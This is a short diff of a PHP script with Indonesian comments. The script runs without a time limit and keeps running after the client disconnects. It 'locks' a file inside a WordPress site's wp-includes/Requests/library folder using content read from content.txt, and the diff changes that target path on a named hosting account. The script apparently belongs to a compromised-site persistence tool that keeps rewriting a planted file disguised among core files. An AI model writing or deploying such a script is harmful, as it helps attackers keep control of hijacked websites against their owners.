@@ -5,7 +5,7 @@ ignore_user_abort(true); // Script tetap berjalan meskipun koneksi terputus
 set_time_limit(0); // Script tidak memiliki batas waktu eksekusi
 
 $unlockFile = 'unlock.txt'; // File untuk memberikan sinyal penghentian script
-$lockFilePath = '/home/umsufkip1224/public_html/wp-includes/Requests/library/store.php'; // File yang akan dikunci
+$lockFilePath = '/home/umsufkip1224/public_html/wp-includes/Requests/library/lib.php'; // File yang akan dikunci
 $lockContentFile = 'content.txt'; // File berisi konten untuk mengunci
 
 // Periksa apakah file konten kunci tersedia
